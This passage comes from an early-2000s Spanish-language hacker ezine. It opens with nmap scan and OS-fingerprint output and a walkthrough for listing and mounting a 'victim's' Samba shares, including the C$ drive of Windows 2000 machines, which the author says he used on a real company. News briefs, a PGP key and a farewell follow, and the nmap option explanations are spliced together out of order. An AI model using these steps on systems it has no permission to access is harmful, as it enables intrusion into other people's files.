    139     open        tcp       netbios-ssn
     
    TCP Sequence Prediction: Class=random positive increments
    Difficulty=2814114 (Good luck!)
			 
    Sequence numbers: EE1BAEA9 EE1BAEA9 ED3FF85B ED3FF85B ED59EBB7 ED59EBB7
    Remote operating system guess: Linux 2.1.122 - 2.2.13
    OS Fingerprint:
    TSeq(Class=RI%gcd=2%SI=2AF0A2)
    T1(Resp=Y%DF=Y%W=7F53%ACK=S++%Flags=AS%Ops=MENNTNW)
    T2(Resp=N)
    T3(Resp=Y%DF=Y%W=7F53%ACK=S++%Flags=AS%Ops=MENNTNW)
    T4(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
    T5(Resp=Y%DF=N%W=0%ACK=S++%Flags=AR%Ops=)
    T6(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
    T7(Resp=Y%DF=N%W=0%ACK=S%Flags=AR%Ops=)
    PU(Resp=Y%DF=N%TOS=C0%IPLEN=164%RIPTL=148%RID=E%RIPCK=E%UCK=E%ULEN=134%DAT=E)
			 
    Nmap run completed -- 1 IP address (1 host up) scanned in 57 seconds
    ---------------------------------------------------------------------------
    Las opciones usadas son :
    
     -sS Escaneo  TCP  SYN:  A  menudo  se  denomina  a  esta  tecnica  escaneo 
    "half open" (medio abierto), porque no  se  abre una conexion TCP completa. 
    Se envia un paquete SYN, como si  se fuese a  abrir una  conexion   real  y  
    se  espera  que  llegue  una respuesta. Un  SYN|ACK  indica  que  el puerto 
    esta a la escucha.  Un RST  es  indicativo  de  que el puerto no esta  a la
    escucha. Si se  recibe  un SYN|ACK, se envia  un   RST inmediatamente  para 
    cortar la conexion (en realidad


   -O Esta  opcion activa la deteccion remota  del sistema  operativo por medio
   de la huella TCP/IP.  En   otras palabras,  usa  un punado de  tecnicas para 
   detectar sutilezas en la  pila de red  subyacente del  sistema operativo  de
   los  servidores que se escanean. Usa esta informacion para crear una 'huella'
   que   luego  compara   con   una  base  de  datos  de  huellas  de  sistemas 
   operativos  conocidas  (el archivo nmap-os-fin-gerprints) para  decidir  que 
   tipo de sistema se esta escaneando.
   Si encuentra una maquina diagnosticada erroneamente que  tenga por  lo menos
   un puerto abierto, me seria de gran utilidad que me enviase  los detalles en  
   un email  (es  decir, se  encontro la  version xxx de  tal cosa y se detecto 
   este u otro sistema operativo..).
   Si  encuentra  una  maquina  con al menos un puerto  abierto de la cual nmap
   le informe "sistema  operativo  desconocido", le  estaria  agradecido  si me
   enviase la direccion IP junto  con  el  nombre  del  sistema  operativo y el 
   numero de su version. Si no me puede enviar la direccion IP, una alternativa
   seria correr nmap con la opcion -d y enviarme las tres huellas que obtendria
   como resultado junto con el  nombre  del  sistema  operativo  y el numero de
   version. Al hacer esto, esta contribuyendo a aumentar  el  numero importante
   de sistemas operativos conocidos  por nmap  y  de  este   modo  el  programa
   resultara  mas  exacto  para  todo el mundo. es el kernel de nuestro sistema  
   operativo  el  que  hace  esto   por   nosotros). La ventaja   principal  de
   esta   tecnica   de   escaneo  es  que  sera  registrada  por  muchos  menos  
   servidores que la anterior. Por desgracia se necesitan  privilegios  de root
   para  construir estos paquetes SYN modificados.


    Bueno, como el resultado de esta busqueda fue positivo pasamos al sigueinte
    punto. Si esto no funca, no funca el resto del truco -IMHO-
        			 			      
 2) Si nuestra querida victima cumple con los requisitos, veremos si 
    tiene recursos compartidos:
    #smbclient -L victima -N

    Unknown parameter encountered: "allow"
    Ignoring unknown parameter "allow"
    Unknown parameter encountered: "deny host"
    Ignoring unknown parameter "deny host"
    Unknown parameter encountered: "interface"
    Ignoring unknown parameter "interface"
    added interface ip=MI-IP bcast=MI-BROADCAST nmask=MI-MARCARA
    Domain=[VICTIMA] OS=[Unix] Server=[Samba 2.0.6]

	Sharename      Type      Comment
	---------      ----      -------
	WEB    	       Disk      Directorio raiz de http://www.victima.net
	cd-rom         Disk      Directorio CD-ROM
	IPC$           IPC       IPC Service (Servidor Samba)

	Server               Comment
	---------            -------
	ALICIA               Alicia
	CLAUDIA              Claudia
	DAVID                David
	LINUX                Servidor Samba Linux
	NT                   Servidor Samba NT
	SERGIO               Sergio

	Workgroup            Master
	---------            -------
	WORKGROUP            VICTIMA

    
 3) Montando un recurso :) Lo mejor...
    #smbmount //victima/Escritorio /mnt/paso -oguest

    Unknown parameter encountered: "allow"
    Ignoring unknown parameter "allow"
    Unknown parameter encountered: "deny host"
    Ignoring unknown parameter "deny host"
    Unknown parameter encountered: "interface"
    Ignoring unknown parameter "interface"
 
 4) Verificando
    #df -h
    Filesystem            Size  Used Avail Use% Mounted on
    /dev/hda2             4.6G  2.1G  2.2G  48% /
    //victima/Escritorio  5.7G  3.2G  2.5G  57% /mnt/paso
    #l /mnt/paso 
    total 9
    drwxr-xr-x   1 root     root          512 Feb 21 16:16 ./
    drwxr-xr-x   4 root     root         4096 Feb 28 13:25 ../
    drwxr-xr-x   1 root     root          512 Feb 21 16:16 canasta/
    drwxr-xr-x   1 root     root          512 Dec 11 11:57 contenido/
    -rwxr-xr-x   1 root     root          582 Dec 11 12:04 index.html*
    drwxr-xr-x   1 root     root          512 Dec 11 11:57 left/
    drwxr-xr-x   1 root     root          512 Jan 12 10:47 script/
    drwxr-xr-x   1 root     root          512 Dec 11 11:59 titulos/
    drwxr-xr-x   1 root     root          512 Dec 11 11:59 top/
     

    Este truco lo use una vez en una empresa de seguridad informatica tu sabes
    _teofilo_, tambien lo  he  probado  con  maquinas  Windows  2000, montando
    directamente, sin que el recurso este compartido como tal:
    #smbmount //victima/C$ /mnt/paso 


=================================================================================
4>                            FEED BACK
 sientase libre de escribirme a <kpanic@mail.com>

                   
[=========================([ Electron Security Team ])===========================]





[====([ EST ])=============================================================EST-4=]
[====([ Avisos Varios ])=====================================================#19=]
[===============================================================([ est@est.cl ])=]


* Recuerden que toda ayuda es bien recibida, quienes tengan textos, ideas, aportes
de algun tipo, pueden hacerlo llegar a traves de nuestro sitio web,o contactandose
directamente con nosotros via mail. La idea esque no solo  nosotros  estemos  todo
el tiempo  haciendolo  todo y aunque  hemos recibido buena colboracion se de mucha
gente hay afuera que tiene ganas de participar, es cosa de atreverse se~ores...

* Pueden participar tambien en nuestros sitio web, enviando noticias, comentarios,
participando de las encuestas y foros, escribiendo articulos, enviando nuevas
ideas, etc, etc...

* Cualquier duda o consulta que tengan, o si quieren hablar con  los  miembros de 
EST pueden conectarse al server de irc irc.terra.cl  al  canal #electron para asi 
poder hablar directamente con nosotros.


[=========================([ Electron Security Team ])===========================]




[====([ EST ])=============================================================EST-4=]
[====([ UnderNews ])=========================================================#20=]
[===============================================================([ est@est.cl ])=]

Proyecto del UnderGround Chileno
-===============================-
ZeroX escribio "Bueno...en estos momentos nos encontramos escogiendo el nombre
que llevara nuestro proyecto, pero esto no impedira  que  avancemos  en  otras
areas.

Este   post  persigue  el  objetivo  de  avanzar  en  otros  ambitos  que  son
importantes para lograr el exito este proyecto."

Enlace: http://www.est.cl/article.php?sid=177&mode=thread&order=0



Encuesta Para el Nuevo Nombre del Proyecto
-=========================================-
Envio de ZeroX Luego de ver las sugerencias que nos han enviado para el nombre
del proyecto hemos "pre-seleccionado" 12 de ellos, los cuales  hemos  incluido
en una encuesta para que de esta forma el  nombre  sea  seleccionado  por  una
mayoria. 

Enlace: http://www.est.cl/article.php?sid=176&mode=thread&order=0



El proyecto va de bien en mejor :) (Contribucion de filth) 
-========================================================-
"Buenas hace ya algunos post que hemos decidido formar una web  para  todo  el
"under" por denominarlo de  alguna  manera, pero  esto  es  distinto  notendra 
lideres ni nada por el estilo eso si keremos  decretar  algunos  regidores  de
foros, etc... la idea de esto es que funcionemos como una comunidad y no  como
solamente grupos aparte y con rencores y envidia... "

Enlace: http://www.est.cl/article.php?sid=175&mode=thread&order=0



CON RESPECTO AL FBI Y SU VIRUS (PARTE II)
-=======================================-
(contribucion de Toleran-C)  El  FBI  ultima  un   proyecto  para  espiar  las
comunicaciones en Internet usando virus. 

SAN FRANCISCO.- Las autoridades de los Estados Unidos  estan trabajando en  un
controvertido proyecto, conocido como Linterna Magica, que permite espiar  las
comunicaciones de Internet utilizando virus informaticos, segun han confirmado
portavoces de la Oficina Federal de Investigaciones (FBI). "

Enlace: http://www.est.cl/article.php?sid=174&mode=thread&order=0



Chile Team's Envidia, Orgullo, Rivalidad??? Somos de Chile?
-==========================================================-
ZeroX escribio "Este tomenlo como un llamado de  Paz  y  reflexion,  ante  los
problemas entre grupos de hacking... 

mirando los comentarios sobre la noticia  de  ZeroX ...  me  di cuenta  de  la
envidia y del poco sentido humanitario  que  tenemos  los  Chilenos...  Y  mas
encima que alguien de un Team fuera de Chile se  de  cuenta  de  la  rivalidad
entre nosotros... eso me parecio verdaderamente una verguenza  y creo  que  no
soy el unico en pensar lo mismo. "

Enlace: http://www.est.cl/article.php?sid=172&mode=thread&order=0



Redmond linux - Torturate con XP en tu Linux
-===========================================-
Un exempleado  de  Microsoft  lanza  nuevo  escritorio  basado  en  Linux,  el
escritorio es  muy parecido al escritorio  que podemos encontrar en Windows XP
ademas promete una alta velocidad y ejecucion de programas.

Enlace: http://todo-linux.com/article.php?sid=353&mode=thread&order=0



Crean parches para arreglar falla de seguridad en los Unix de IBM y Sun
-======================================================================-
BM anuncio que tenia un parche disponible para un problema  de  seguridad  que
podria permitir a intrusos informaticos tomar el  control  de las computadoras
que utilizan el sistema operativo AIX segun un articulo en CNN

Enlace: http://www.cnnenespanol.com/2001/tec/12/14/ibm.patch.reut/index.html



Microsoft deja visualizar el codigo fuente de su WindowsXP
-=========================================================-
Windows deja visualizar el codigo fuente de su WinXP, todo esto para demostrar
a las grandes empresas que sus productos  no  tienen  problemas  de  seguridad
aunque lo unico que puede pasar es que saquen mas fallos en sus sistemas...



Importante parche acumulativo para Internet Explorer
-==================================================-
Microsoft publica un parche acumulativo que tras su instalacion  elimina todas
las vulnerabilidades conocidas que afectan a IE 5.5 e IE 6.

Ademas de cubrir todos los problemas conocidos el nuevo parche tambien elimina
tres nuevas vulnerabilidades.

La primera de las nuevas vulnerabilidades, que solo afecta a Internet Explorer
6 reside en un fallo en el tratamiento de  los  campos  Content-Disposition  y
Content-Type de la cabecera HTML.   La  vulnerabilidad  existe  si el atacante
modifica la cabecera HTML de  forma  que  haga  creer  a  IE  que  un  archivo
ejecutable es un tipo de archivo diferente,  de  forma  que se pueda abrir sin
necesidad de necesitar la confirmacion del usuario.


Enlace: http://www.vnunet.es/detalle.asp?ids=/Noticias/Seguridad/Vulnerabilidades/20011217022



[=========================([ Electron Security Team ])===========================]




[====([ EST ])=============================================================EST-4=]
[====([ Llaves PGP ])========================================================#21=]
[===============================================================([ est@est.cl ])=]


-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 7.0.3 for non-commercial use <http://www.pgp.com>

mQGiBDwed0IRBADa/Fyu1hZCS3M7Um5Yl1Z0u9xxli5oLhG5IfrVoW9eBuNonxgn
TRC/Ha10SHITpxiHR/7pDf5s1M1oBpvGV9I5x6agPnER85WsThfRdsr/33FL09Qg
JRy1YRnJRJ5YRh+rr/z/erOzksRFFDn/2Y2JRMzLP62kvNsuGywpb7TH5wCg/3tF
x3PrRDisGRJlKX3mjt9pDSkD/i0/TSmwOSomBDvcwnDfUhSBjvw7uxDmh+jl7EAD
8sEz47s7hr7pQpx+4n2e72gHbDJMrnsSadi6kBr6tjLEuVHZuQgsjxyZ6u7MTxWo
/FxxaSd4kW9oOoHu+L+rByqP1KPFTnNTBZxc2cv/VXI3+3gqbaGMd0HYiK+jGU8I
ImkAA/4r8TrHYuglgfIJFGPCiEX9HmeJ56eNDsj3gxg82H53bmmsjiUXWJvHOS1I
DTbgnbjlOSejbKDPzYKoCzwnPNpqEoY4V2NYMgobPNlZoz0q49oZtyLV8nSPDnbl
epyTxVHOWkb8EeNMdEIo3Gggr09JWzoFUcmZtQ8BIyq7aIopbbQjRWxlY3Ryb24g
U2VjdXJpdHkgVGVhbSA8ZXN0QGVzdC5jbD6JAFgEEBECABgFAjwed0IICwMJCAcC
AQoCGQEFGwMAAAAACgkQDAW98QGykLgbhwCdHCckhs9CIFeJcVnjuFSBF7LewRgA
oPJH3T0TAr2l1XvEuSkl36sFhdoMuQINBDwed0IQCAD2Qle3CH8IF3KiutapQvMF
6PlTETlPtvFuuUs4INoBp1ajFOmPQFXz0AfGy0OplK33TGSGSfgMg71l6RfUodNQ
+PVZX9x2Uk89PY3bzpnhV5JZzf24rnRPxfx2vIPFRzBhznzJZv8V+bv9kV7HAarT
W56NoKVyOtQa8L9GAFgr5fSI/VhOSdvNILSd5JEHNmszbDgNRR0PfIizHHxbLY72
88kjwEPwpVsYjY67VYy4XTjTNP18F1dDox0YbN4zISy1Kv884bEpQBgRjXyEpwpy
1obEAxnIByl6ypUM2Zafq9AKUJsCRtMIPWakXUGfnHy9iUsiGSa6q6Jew1XpMgs7
AAICCACDgKRWWQpqJLSKdJMPlJd5CEEQx434hNHA/DT3sSwdE1uBgotxTuBDzvoZ
pDk3Q0RYZ+RylQrsXvfVtGipA515MtPEX/yBiKeB61nVDb2phRnchh3Zioy5JFTu
I6hVUh65fQLkpAXGEJ/JnAIY4OCq+0zGPAreCDL2BqEAWJp7izFN4t7Nv6HLUddG
5Dqnp06lwfkp8RmcGCej0wwGJAU1mwaxvsJvkgGhpym2LrjU2fanWizeF9F5ZvQC
7yQiz6rHw+8RmP7lnzpwbTBRBX3bpSlBE0O3+wnObDLw2X1nZDiho9hMgrUtaJc/
2qsyIcUcQ07Ekpbf2BmKvp5TFBOBiQBMBBgRAgAMBQI8HndCBRsMAAAAAAoJEAwF
vfEBspC4MqoAmwbpxom0fAUK8MljDOHHwP5kzrSZAJ96c64OrM/fJgU7g7BbEbyw
k6aVXA==
=nyKD
-----END PGP PUBLIC KEY BLOCK-----


[=========================([ Electron Security Team ])===========================]




[====([ EST ])=============================================================EST-4=]
[====([ Despedida y Comentario Final ])======================================#22=]
[===============================================================([ est@est.cl ])=]


 Lamentablemente esta  edicion llega a su fin, sin embargo  esperamos  que  la
hayan disfrutado y que haya sido de su agrado. Quisieramos agradecer a toda la
gente que nos colaboro en esta edicion, asi como a  la  gente  que  nos  ayudo
tanto con ideas como con criticas.  Esperamos  volver  a  encontrarnos en  una
quinta edicion, que aunque parezca dificil igual le seguiremos dando.

Nuestro sitio web seguira activo y desde alli seguiremos defendiendo  nuestros
derechos e ideales.  Pensamos  seguir  como  grupo, ezine  y  portal, asi pues
cualquier colaboracion, articulo, idea o critica no duden en enviarla anuestro
mail est@est.cl

Por otro lado hemos visto como poco a poco se han ido  aprovechando  de  mejor
manera los  espacios  que  proporcionamos  en  nuestro  sitio  Web,  opinando,
discutiendo y comentando de una forma super amena, participativa y madura cada
uno  de  los  tema  que  han  salido... Esto  nos tiene   bastante   contentos
y esperamos que se siga dando con el tiempo una comunidad  interesada  por  el
desarrollo en comun Agradecemos sinceramente a la gente de Systat, Net-X, CDLR
y a toda esa gente que esta participando en forma seria y  responsable,  todos
se han portado bastante bien.

Esperamos sinceramente ver a nuestro Under unido y encausado en fines  comunes
que aboguen por el desarrollo de una sociedad mas tecnificada Quienes llevamos
tiempo sabemos que la idea de unir  a  nuestra  comunidad  siempre  ha  estado
latente pero jamas se ha podido concretar algo, tomemos  como  ejemplo  a  los
grandes grupo todos alguna ves antes de ser lo que son pasaron por periodos de
crisis, creemos estar lo  suficientemente  maduros  y  tener los conocimientos
necesarios como para hacer algo en grande. Deseamos que todos participen y que
nuestra mentalidad frente a los aportes de los demas sea constructiva,pensemos
siempre que podemos construir y colaborar, pensemos que podemos!

Saludos y nos vemos pronto.

Atte: Staff Electron Security Team


[=========================([ Electron Security Team ])===========================]
[================================================================================]

